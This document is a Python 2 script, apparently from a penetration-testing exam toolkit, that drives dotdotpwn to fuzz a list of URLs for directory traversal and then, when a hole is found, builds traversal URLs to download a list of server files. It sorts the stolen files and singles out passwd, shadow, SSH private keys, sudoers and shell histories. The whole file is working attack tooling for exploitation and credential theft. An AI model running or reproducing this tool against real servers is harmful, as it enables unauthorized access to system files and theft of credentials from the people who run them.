#!/usr/bin/python

#ONLY WEB HAS BEEN IMPLEMENTED
#If /usr/share/dotdotpwn/Reports exists, dotdotpwn will automatically put raw results in there for you
#Reconscan.py creates the Reports directory for you

import sys
import os
import subprocess
from subprocess import CalledProcessError
import argparse
import multiprocessing
from multiprocessing import Process, Queue
import requests
import time
from shutil import move

#This function currently runs regular and an extension web scans using ddpwn on a list of URLs
#If something is found, it will output the result to the /dirb/ directory
def dotPwn(URL):
#Usage: ./dotdotpwn.pl -m <module> -h <host> [OPTIONS]
#	Available options:
#	-m	Module [http | http-url | ftp | tftp | payload | stdout]
#	-h	Hostname
#	-O	Operating System detection for intelligent fuzzing (nmap)
#	-o	Operating System type if known ("windows", "unix" or "generic")
#	-s	Service version detection (banner grabber)
#	-d	Depth of traversals (e.g. deepness 3 equals to ../../../; default: 6)
#	-f	Specific filename (e.g. /etc/motd; default: according to OS detected, defaults in TraversalEngine.pm)
#	-E	Add @Extra_files in TraversalEngine.pm (e.g. web.config, httpd.conf, etc.)
#	-S	Use SSL for HTTP and Payload module (not needed for http-url, use a https:// url instead)
#	-u	URL with the part to be fuzzed marked as TRAVERSAL (e.g. http://foo:8080/id.php?x=TRAVERSAL&y=31337)
#	-k	Text pattern to match in the response (http-url & payload modules - e.g. "root:" if trying /etc/passwd)
#	-p	Filename with the payload to be sent and the part to be fuzzed marked with the TRAVERSAL keyword
#	-x	Port to connect (default: HTTP=80; FTP=21; TFTP=69)
#	-t	Time in milliseconds between each test (default: 300 (.3 second))
#	-X	Use the Bisection Algorithm to detect the exact deepness once a vulnerability has been found
#	-e	File extension appended at the end of each fuzz string (e.g. ".php", ".jpg", ".inc")
#	-U	Username (default: 'anonymous')
#	-P	Password (default: 'dot@dot.pwn')
#	-M	HTTP Method to use when using the 'http' module [GET | POST | HEAD | COPY | MOVE] (default: GET)
#	-r	Report filename (default: 'HOST_MM-DD-YYYY_HOUR-MIN.txt')
#	-b	Break after the first vulnerability is found
#	-q	Quiet mode (doesn't print each attempt)
#	-C	Continue if no data was received from host

# why am I not using the -p option for filename with payloads?
    port, resultsOut, baseURL, URL, module = parseURL(URL)
    konfirmString,konfirmFile = setDotPwnOptions()
    if ("TRAVERSAL" in URL):
        #last update added 'module' (previously http-url) and -h for host. May need to revert
        #if the -h option breaks http-url
        DOTPWN = 'dotdotpwn.pl -m %s -u %s -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -q -C -b' % (module, URL, baseURL, konfirmString, konfirmFile, args.depth, args.os, port)
        print "DOTPWN: %s" % DOTPWN
        DOTPWNE = 'dotdotpwn.pl -m %s -u %s -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (module, URL, baseURL, konfirmString, konfirmFile, args.depth, args.os, port, args.extensions)
    else:
        print "WARN: NO 'TRAVERSAL' TARGETING STRING FOUND IN URL"
        DOTPWN = 'dotdotpwn.pl -m http -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -q -C -b' % (baseURL, konfirmString, konfirmFile, args.depth, args.os, port)
        DOTPWNE = 'dotdotpwn.pl -m http -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (baseURL, konfirmString, konfirmFile, args.depth, args.os, port, args.extensions)
    try:
        DOTPWNRESULTS = subprocess.check_output(DOTPWN, shell=True)
    except CalledProcessError as ex:
        writeOutputFile = True
        text = ex.output.split("\n")
        for line in text:
            if ("[+] Total Traversals found: 0" == line):
                print "INFO: No traversals found for %s" % URL
                writeOutputFile = False
            if ("<- VULNERABLE" in line):
                vuln.append(line)
        if (writeOutputFile):
            try:
                outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/%s" % resultsOut
                print "INFO: Traversals found! See %s" % outfile
                outFileWriter = open(outfile, "w")
                outFileWriter.write(ex.output)
                outFileWriter.close()
            except:
                raise
    if (len(vuln) == 0): #don't run extension scan if we already have a vuln
        try:
            DOTPWNERESULTS = subprocess.check_output(DOTPWNE, shell=True)
        except CalledProcessError as fx:
            writeOutputFile = True
            textE = fx.output.split("\n")
            for line in textE:
                if ("[+] Total Traversals found: 0" == line):
                    print "INFO: No traversals found for %s using file extensions" % URL
                    writeOutputFile = False
                if ("<- VULNERABLE" in line):
                    vuln.append(line)
            if (writeOutputFile):
                try:
                    outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/E%s" % resultsOut
                    print "INFO: Traversals found using extensions! See %s" % outfile
                    outFileWriter = open(outfile, "w")
                    outFileWriter.write(fx.output)
                    outFileWriter.close()
                except:
                    raise
    if (args.scan_and_retrieve and len(vuln) > 0):
        print "INFO: Downloading files"
        retrieve()

#grab pieces to build URL, feed in files to grab,
def retrieve():
    vulnURLs = analyzeVuln(vuln)
    tmp = vulnURLs[0]
    vulnProto = tmp[0]
    vulnBase = tmp[1]
    vulnPage = tmp[2]
    vulnStringPrefix = tmp[3]
    vulnStringSuffix = tmp[4]
    encodedSplit = tmp[5]
    try:
        xfilFileName = "%s" % args.xfil_files
        xfilFile = open(xfilFileName,'r')
        for xfil in xfilFile:
            if (xfil[0] == "/"):
                xfil = xfil[1:]
            if ("\n" in xfil):
                xfil = xfil[:-1]
            xfiltmp = xfil.replace("/", "_") #for outputFile
            vulnBasetmp = vulnBase.replace("/", "_") #for outputFile
            xfil = xfil.replace("/", encodedSplit)
            #2x vulnStringPrefix due to a parsing bug. Additional shouldn't hurt....
            if vulnPage == "":
                fullURL = vulnProto + vulnBase + vulnStringPrefix + vulnStringPrefix + xfil + vulnStringSuffix
            else:
                fullURL = vulnProto + vulnBase + vulnPage + vulnStringPrefix + vulnStringPrefix + xfil + vulnStringSuffix
            #print "DEBUG: %s" % fullURL
            fileContents, status_code = grabFileFromURL(fullURL)
            if (status_code == 200):
                outputFile = "/root/scripts/recon_enum/results/exam/dotdotpwn/%s_%s" % (vulnBasetmp, xfiltmp)
                try:
                    output = open(outputFile, 'w+')
                    output.write(fileContents)
                    output.close()
                except UnicodeEncodeError:
                    #print "WARNING: Unicode errors. Forcing ascii, xmlcharrefreplace"
                    output = open(outputFile, 'w+')
                    fileContents = fileContents.encode('ascii','xmlcharrefreplace')
                    output.write(fileContents)
                    output.close()
                except:
                    raise
    except:
        raise
    sortRetrievedFiles()
    time.sleep(1)
    sortMostInterestingFiles()
    time.sleep(1)
    sortEverythingElse()
    print "INFO: Downloading of files complete"

def grabFileFromURL(url):
    try:
        r = requests.get(url)
        if (r.status_code == 200):
            return r.text, r.status_code
        else:
            return False, r.status_code
    except:
        raise


def sortRetrievedFiles():
    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
    os.chdir(downloadDir)
    files = os.listdir(downloadDir)
    sizes = []
    moveTheseFiles = []
    for item in files:
        if os.path.isfile(item):
            sizes.append(os.path.getsize(item))
    for size in sizes:
        if sizes.count(size) > 3:
            moveTheseFiles.append(size)
    for sizeOfitems in moveTheseFiles:
        try:
            os.makedirs(str(sizeOfitems))
        except:
            pass
            #print "Warning: Dir already exists"
        for items in files:
            if os.path.getsize(items) == sizeOfitems:
                newpath = "./%s/%s" % (str(sizeOfitems),items)
                os.rename(items,newpath)
                files.remove(items)

def sortMostInterestingFiles():
    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
    os.chdir(downloadDir)
    files = os.listdir(downloadDir)
    mostInterestingFiles = "passwd","shadow","id_rsa","id_dsa","passdb","samba","ssh","authorized","sudoers","history"
    try:
        os.makedirs("mostInteresting")
    except:
        pass
    for item in files:
        for name in mostInterestingFiles:
            if (name in item):
                new = "./mostInteresting/%s" % (item)
                move(item,new)
                break

def sortEverythingElse():
    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
    os.chdir(downloadDir)
    files = os.listdir(downloadDir)
    everythingElse = "etc","var","proc"
    try:
        for folder in everythingElse:
            os.makedirs(folder)
    except:
        pass
    for item in files:
        for name in everythingElse:
            if (os.path.isdir(item)):
                break
            if (name in item):
                new = "./%s/%s" % (name,item)
                move(item,new)
                break

##1, grab port
##2, output file cannot have "/" in filename
##3, grab base url, http module doesn't like http://
##4, file has \n causing errors in query, strip those
def parseURL(url):
    tmp = url.split(":")
    if (len(tmp) == 3):
        tmp2 = tmp[2]
        port = tmp2.split("/")[0]
    if (len(tmp) <= 2):
        if ("https" == tmp[0]):
            port = "443"
        elif ("http" == tmp[0]):
            port = "80"
    if (len(tmp) > 3): #this should never happen
        port = "80"
    try:
        resultsOut = url.split("/")[2] + url.split("/")[3]
    except:
        raise
    tmp4 = url.split(":")[1]
    baseURL = tmp4[2:]
    if ("\n" in url):
        URL = url[:-1]
    else:
        URL = url
    if ("http" in URL):
        module = "http-url"
    elif ("ftp" in URL):
        module = "ftp"
    #print "Port, resOut, baseURL, URL: %s %s %s %s %s" % (port, resultsOut, baseURL, URL, module)
    return port, resultsOut, baseURL, URL, module

def setDotPwnOptions():
    if (args.os == "unix"):
        konfirmString = '"root:"'
        konfirmFile = '/etc/passwd'
    if (args.os == "windows"):
        konfirmString = '"[fonts]"'
        konfirmFile = '/windows/win.ini'
    return konfirmString,konfirmFile


#will return values to build a string like base+page+pre+path+encodedsplit+userrequestfile+suffix
#let base = IP:Port/
#let vulnPage = page.ext[/|=]
def analyzeVuln(vulnar):
    final = []
    for vuln in vulnar:
        vulnProto = ""
        vulnURL = []
        vulnBase = ""
        vulnPage = ""
        vulnStringPrefix = ""
        vulnStringSuffix = ""
        encodedSplit = ""
        tmp = vuln[17:len(vuln)-14] #vuln is entire line from [*] testing url... to <- VULNERABLE
        vulnURL.append(tmp)
        if ("http://" in tmp):
            vulnProto = "http://"
            vulnBase = tmp.split("http://")[1]
        if ("https://" in tmp):
            vulnProto = "https://"
            vulnBase = tmp.split("https://")[1]
        if ("ftp://" in tmp):
            vulnProto = "ftp://"
            vulnBase = tmp.split("ftp://")[1]
        vulnPagetmp = vulnBase.split("/",1)[1]
        vulnBase = vulnBase.split("/",1)[0]
        vulnBase = vulnBase + "/"
        #print "DEBUG: vulnBase %s" % vulnBase
        #print "DEBUG: vulnPagetmp: %s" % vulnPagetmp
        if ("=" in vulnPagetmp): #vulnPage with param, ie 'index.php?arg='
            vulnPage = vulnPagetmp.split("=",1)[0]
            vulnPage = vulnPage + "="
            vulnStringPrefixtmp = vulnPagetmp.split("=",1)[1]
        else:                 #vulnPage with no param, ie index.php/
            if ("passwd" in vulnPagetmp or "win.ini" in vulnPagetmp):
                #the vulnPage may be equal to the vulnBase/webRoot, no specific page
                vulnPage = ""
            else:
                vulnPage = vulnPagetmp.split("/",2)[0]
                vulnPage = vulnPage + "/"
            #print "DEBUG: vulnPagetmpsplit %s" % vulnPagetmp.split("/",2)
            vulnStringPrefixtmp = vulnPagetmp.split("/",2)[len(vulnPagetmp.split("/",2))-1]
            #print "DEBUG: vulnStringPrefixtmp: %s" %vulnStringPrefixtmp
        if (args.os == 'unix'): #looking for passwd and issue, user specified file not available yet
            vulnStringPrefix = vulnStringPrefixtmp.split("etc")[0]
            encodedSplittmp = vulnStringPrefixtmp.split("etc")[1]
            if ("passwd" in vulnStringPrefixtmp):
                vulnStringSuffix = vulnStringPrefixtmp.split("passwd")[1]
                for c in encodedSplittmp:
                    if (c == "p"):
                        break
                    else:
                        encodedSplit = encodedSplit + c
            if ("issue" in vulnStringPrefixtmp):
                vulnStringSuffix = vulnStringPrefixtmp.split("issue")[1]
                for c in encodedSplittmp:
                    if (c == "p"):
                        break
                    else:
                        encodedSplit = encodedSplit + c
        if (args.os == 'windows'):
            print "VulnStringPrefixtmp: " + vulnStringPrefixtmp
            vulnStringPrefix = vulnStringPrefixtmp.split("windows")[0]
            encodedSplittmp = vulnStringPrefixtmp.split("windows")[1]
            if ("win.ini" in vulnStringPrefixtmp):
                vulnStringSuffix = vulnStringPrefixtmp.split("win.ini")[1]
                for c in encodedSplittmp:
                    if (c == "w"):
                        break
                    else:
                        encodedSplit = encodedSplit + c
        vals = vulnProto, vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit
        print "DEBUG: Make sure these values are correct: vulnProto, vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit"
        print vals
        final.append(vals)
    return final

if __name__=='__main__':

    parser = argparse.ArgumentParser(description='Rough script to handle discovery of and exfiltration of data through directory traversal. Recommend invoke with: dirTrav <URLs> <os> -sr')
    parser.add_argument('-d', '--scan-depth', type=int, action="store", dest="depth", default=10, help="depth of ../../../ to extend to, default of 10")
    parser.add_argument('-e', '--extensions', type=str, action="store", dest="extensions", default='".html"', help='extensions appended at the end of each fuzz string (e.g. \'".php", ".jpg", ".inc"\'  Entire list needs to be encased in single quotes. Each extension needs to be in double quotes. There needs to be a comma and a space between each extension)')
    parser.add_argument('file', type=str, help="file with URLs to fuzz")
    parser.add_argument('os', type=str, action="store", help="OS greatly helps reduce false positives and reduces scan time. 'windows' or 'unix'")
    parser.add_argument('-s', '--scan', action="store_true", dest="scan", default="true", help="scan the target for directory traversal")
    parser.add_argument('-sr', '--scan-and-retrieve', nargs='?', const='true', default='false', dest="scan_and_retrieve", help="scan and retrieve files if a directory traversal is found")
    parser.add_argument('-x', '--xfil-files', type=str, action="store", dest="xfil_files", default="/root/lists/Personal/DirTrav/linux_all.txt", help="list of files to retrieve if a directory traversal vulnerability is found. Default is linux_all.txt.")

    args = parser.parse_args()
    #print args
    vuln = []
    inputFileName = "%s" % args.file
    if (args.os == "windows"):
        if ("linux_all.txt" in args.xfil_files):
            print "Error: Will not retrieve linux files from Windows. Set os to Linux or pass a file with Windows files to -x"
            raise
	if (args.os == "linux"):
		if ("windows_all.txt" in args.xfil_files):
			print "Error: Will not retrieve windows files from Linux. Set os to Windows or pass a file with Linux files to -x"
			raise

    if (args.scan):
        try:
            inputFile = open(inputFileName,'r')
            jobs = []
            print "INFO: Starting Dotdotpwn"
            for URL in inputFile:
                if ("\n" in URL):
                    URL = URL[:-1]
                if (URL[0] != "#"):
                    #print "Processing %s" % URL
                    p = multiprocessing.Process(target=dotPwn, args=(URL,))
                    jobs.append(p)
                    p.start()
            inputFile.close()
        except:
            raise
